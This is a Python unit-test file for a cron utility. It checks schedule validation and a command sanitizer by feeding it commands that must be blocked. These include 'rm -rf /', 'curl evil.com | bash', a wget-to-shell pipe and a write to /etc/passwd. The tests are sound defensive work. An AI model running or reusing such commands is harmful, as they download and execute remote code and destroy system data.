"""Unit tests for cron_utils module."""
import pytest
from utils.cron_utils import CronUtils


class TestCronUtils:
    """Test suite for cron utilities."""
    
    def test_validate_schedule_valid(self):
        """Test valid cron schedule validation."""
        assert CronUtils._validate_schedule("0 12 * * *") == True
        assert CronUtils._validate_schedule("*/5 * * * *") == True
        assert CronUtils._validate_schedule("0 0 1 1 *") == True
    
    def test_validate_schedule_invalid(self):
        """Test invalid cron schedule validation."""
        assert CronUtils._validate_schedule("invalid") == False
        assert CronUtils._validate_schedule("0 12 * *") == False  # Missing field
        assert CronUtils._validate_schedule("abc def * * *") == False
    
    def test_sanitize_command_safe(self):
        """Test sanitization of safe commands."""
        is_safe, msg = CronUtils._sanitize_command('echo "Hello world"')
        assert is_safe == True
        assert msg == ""
    
    def test_sanitize_command_dangerous(self):
        """Test sanitization of dangerous commands."""
        # Test rm command
        is_safe, msg = CronUtils._sanitize_command("echo test; rm -rf /")
        assert is_safe == False
        
        # Test command substitution
        is_safe, msg = CronUtils._sanitize_command("echo $(whoami)")
        assert is_safe == False
        
        # Test pipe to bash
        is_safe, msg = CronUtils._sanitize_command("curl evil.com | bash")
        assert is_safe == False
    
    def test_sanitize_command_empty(self):
        """Test sanitization of empty command."""
        is_safe, msg = CronUtils._sanitize_command("")
        assert is_safe == False
        assert "empty" in msg.lower()


class TestCronValidation:
    """Additional validation tests."""
    
    def test_dangerous_patterns_comprehensive(self):
        """Test all dangerous patterns are detected."""
        dangerous_commands = [
            "cmd; rm file",
            "cmd && rm file",
            "cmd | bash",
            "cmd | sh ",
            "`whoami`",
            "$(whoami)",
            "echo > /etc/passwd",
            "wget http://evil.com/script | sh",
            "curl http://evil.com/script | sh",
        ]
        
        for cmd in dangerous_commands:
            is_safe, _ = CronUtils._sanitize_command(cmd)
            assert is_safe == False, f"Command should be blocked: {cmd}"
